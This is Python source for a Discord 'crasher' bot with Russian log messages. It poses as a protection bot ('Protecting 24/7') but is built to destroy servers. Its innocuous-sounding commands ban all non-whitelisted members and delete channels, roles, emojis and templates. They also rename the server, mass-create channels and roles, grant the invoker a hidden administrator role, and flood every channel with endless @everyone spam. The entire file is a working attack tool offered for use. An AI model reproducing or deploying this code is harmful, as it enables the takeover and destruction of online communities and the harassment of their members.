import discord, os, sys, random, string, requests, configparser, json, asyncio, time
from discord.ext import commands
from discord import Permissions
from colorama import Fore, init
from os import system, name
init()

config = configparser.ConfigParser()
config.read('config.ini')

Token = config.get("Crasher", "Token")
whit = json.loads(config.get("Crasher", "Whitelist"))



if name == "nt":
        _ = system("cls")

else:
        _ = system("clear")

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='$', intents=intents )


async def banall(ctx):
    author = ctx.message.author
    print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
    ban = 0
    bany = 0
    wta = 0
    for member in ctx.guild.members:
        if member.id not in whit:
            try:
                ban += 1
                await member.ban()
                bany += 1
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не допущен! нет в вайтлисте{Fore.WHITE}: {member}")
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}")
                continue
        elif member.id in whit:
            ban += 1
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не трогаю допущенного {Fore.WHITE}: {member}")
            wta += 1
    print(f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {ban} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а забанил{Fore.WHITE}: {bany} {Fore.RED} человек {Fore.WHITE}.")
    
async def chistch(ctx):
    await ctx.send("РЕЙВ ПАТИИИИИ! СЕРВЕР ПОД КРОВАТЬЮ! @everyone ")
    await ctx.guild.edit(name="Концерт фейса")
    print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
    
    print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось удалить {channel}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
    
async def chistrl(ctx):
    print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            try:
                await role.delete()
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
                continue
        else:
            break
    print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")
    
async def masks(ctx):
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}]{member}, Поиграем в маскарад? Твоя маска {nickname}")
        except Exception as e:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все теперь анонизмусы{Fore.WHITE}.")

async def spamch(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
    for b in range(200):
        await ctx.guild.create_text_channel("CRASH9D")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")

async def spamrl(ctx):   
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим ролями")
    for a in range(200):
        await ctx.guild.create_role(name="Crash9d")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")

async def chistemoji(ctx):
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
            continue 
    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")

async def chisttemp(ctx):
    try:
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Чистим шаблоны")
        bebrus = await ctx.guild.templates()
        await asyncio.sleep(2)
        for template in bebrus:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Шаблон почистил!")
            await template.delete()
            await asyncio.sleep(2)
        print(f"{Fore.WHITE}> {Fore.RED}Все шаблоны почистились!{Fore.WHITE}.")
    except:
        pass

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('Protecting 24/7'))
    print(f"""{Fore.RED}

  ____ _    _   _ _____ _____ _   _ 
 / ___| |  | | | |_   _| ____| \ | |
| |  _| |  | | | | | | |  _| |  \| |
| |_| | |__| |_| | | | | |___| |\  |
 \____|_____\___/  |_| |_____|_| \_|

{Fore.RED} Здрасьте, это ГЛЮТЕН и
{Fore.RED} Полное адище начинается ;)""")

@client.command()
async def hlp(ctx):
    asyncio.create_task(chisttemp(ctx))
    asyncio.create_task(banall(ctx))
    asyncio.create_task(chistch(ctx))
    asyncio.create_task(chistemoji(ctx))
    asyncio.create_task(chisttemp(ctx))
    await chistrl(ctx)

    asyncio.create_task(masks(ctx))
    asyncio.create_task(spamch(ctx))
    await spamrl(ctx)
    print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")


    


    
@client.command()
async def game(ctx, pos: int):
    try:
        await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
        role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
        await role.edit(position=pos, reason="Админ идиот")
        await ctx.message.author.add_roles(role)
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
    except discord.HTTPException:
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")
        

@client.command()
async def start(ctx):
  roles = ctx.guild.roles
  roles.pop(0)
  for role in roles:
      if ctx.guild.me.roles[-1] > role:
           try:
                await role.delete()
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
           except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
                continue
      else:
          break
  print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")

async def spamth1(ctx):
    while True:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")

async def spamth2(ctx):
    while True:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")


async def spamth3(ctx):
    while True:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")


async def spamth4(ctx):
    while True:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")

async def spamth5(ctx):
    while True:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")

async def spamth6(ctx):
    while True:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")

@client.command()
async def ml(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спам активирован")
    asyncio.create_task(spamth1(ctx))
    asyncio.create_task(spamth2(ctx))
    asyncio.create_task(spamth3(ctx))
    asyncio.create_task(spamth4(ctx))
    asyncio.create_task(spamth5(ctx))
    asyncio.create_task(spamth6(ctx))

@client.command()
async def gamehelp(ctx):
    rls = 0
    for role in ctx.guild.roles:
     rls +=1
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Нашел роль {role}, по счету {rls}")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Найдено {rls} ролей")


@client.command()
async def gif(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Рассылаем гифки")
    for channel in ctx.guild.text_channels:
     await channel.send("https://gfycat.com/flakyacrobatickusimanse")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Кинул гифку в {channel}")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Разослал гифки")


try:
    client.run(Token)
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()
